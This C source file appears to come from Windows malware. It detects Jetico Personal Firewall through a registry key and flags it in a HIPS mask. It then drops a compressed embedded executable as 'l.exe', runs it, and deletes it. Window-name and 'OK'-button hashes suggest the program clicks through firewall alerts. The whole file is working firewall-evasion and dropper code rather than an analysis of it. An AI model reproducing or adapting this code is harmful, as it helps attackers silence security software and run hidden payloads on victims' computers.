#define JETICO_WINDOW_NAME_HASH     0x88a24b28 // Jetico Personal Firewall
#define JETICO_WINDOW_CLASS_HASH    0x44551112 // #32770
#define JETICO_BUTTON_NAME_HASH     0x9e000004 // OK
#define JETICO_BUTTON_CLASS_HASH    0xb0de1b36 // Button

#include "JeticoBin.c"

void ph_detect_jetico()
{
    PCHAR pMem = 0, pWrFileBuffer = 0;
    DWORD dSize = 0, dwReturn;
    HANDLE hFile = 0;
    HKEY hKey;
    STARTUPINFOW si;
    PROCESS_INFORMATION procInfo;

    if (fn_RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Jetico\\Personal Firewall", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        globalData.gHIPSMask |= HIPS_JETICO;
        fn_CloseHandle(hKey);
    }
    else {
        return;
    }

    hFile = fn_CreateFileW(L"l.exe", GENERIC_READ + GENERIC_WRITE , FILE_SHARE_READ + FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        return;
    }

    dSize = F2EXE_SIZE*2;
    utils_lzma_decompress(FindWindFile, F2ZIP_SIZE, (pvoid_t*)&pWrFileBuffer, &dSize);
    fn_WriteFile(hFile,pWrFileBuffer,F2EXE_SIZE,&dwReturn,0);

    fn_VirtualFree(pWrFileBuffer, F2EXE_SIZE*2,MEM_DECOMMIT|MEM_RELEASE);

    fn_CloseHandle(hFile);
    //Run File!
    __stosb((uint8_t*)&si, 0, sizeof(si));
    si.cb = sizeof(si);
    __stosb((uint8_t*)&procInfo, 0, sizeof(procInfo));

    if (!fn_CreateProcessW(0, L"l.exe", 0, 0, 0, 0, 0, 0, &si, &procInfo)) {
        //INLOG("JeticoDetect()::CreateProccess() FAIL ", fn_GetLastError());
    }

    fn_DeleteFileW(L"l.exe");
    /*INLOG("JeticoDetect():: DeleteFileW() ", fn_GetLastError());*/

    if (fn_MoveFileExW(L"l.exe", 0, MOVEFILE_DELAY_UNTIL_REBOOT) == 0) {
        //INLOG("JeticoDetect()::MoveFileExW() Delete source file failed!!",fn_GetLastError());
    }
}